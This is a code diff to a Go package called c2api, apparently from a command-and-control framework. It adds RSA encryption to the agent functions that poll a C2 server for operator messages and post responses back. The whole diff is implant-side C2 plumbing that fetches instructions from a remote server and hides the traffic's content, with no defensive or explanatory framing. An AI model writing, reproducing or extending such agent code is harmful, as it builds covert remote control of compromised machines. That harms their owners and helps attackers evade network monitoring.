@@ -3,11 +3,14 @@ package c2api
 import (
 	"bufio"
 	"bytes"
+	"crypto/rsa"
 	"encoding/json"
 	"io"
 	"net/http"
 	"strings"
 	"time"
+
+	cry "github.com/zarkones/xena-crypto"
 )
 
 const MESSAGE_STREAM_SEPARATOR = "\r\r\r\r\r"
@@ -89,7 +92,7 @@ func FetchMessages(agentID string) (messages []Message, err error) {
 }
 
 // AgentFetchMessages will reach out to C2 server and fetch messages to which it has not reponded.
-func AgentFetchMessages(agentID string) (messages []Message, err error) {
+func AgentFetchMessages(agentID string, decryptionKey *rsa.PrivateKey) (messages []Message, err error) {
 	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/messages/"+agentID, nil)
 	if err != nil {
 		return nil, err
@@ -100,7 +103,17 @@ func AgentFetchMessages(agentID string) (messages []Message, err error) {
 		return nil, err
 	}
 
-	if err = json.NewDecoder(resp.Body).Decode(&messages); err != nil {
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	decrypted, err := cry.SecureUnwrap(decryptionKey, string(respBody))
+	if err != nil {
+		return nil, err
+	}
+
+	if err := json.Unmarshal([]byte(decrypted), &messages); err != nil {
 		return nil, err
 	}
 
@@ -126,7 +139,12 @@ func AgentRespondToMessage(messageID, pipelineExecutionID, response string) (err
 		return err
 	}
 
-	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/respond", bytes.NewBuffer(jsonMsgResp))
+	encrypted, err := cry.SecureWrap(TrustedPubKey, string(jsonMsgResp))
+	if err != nil {
+		return err
+	}
+
+	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/respond", bytes.NewBuffer([]byte(encrypted)))
 	if err != nil {
 		return err
 	}
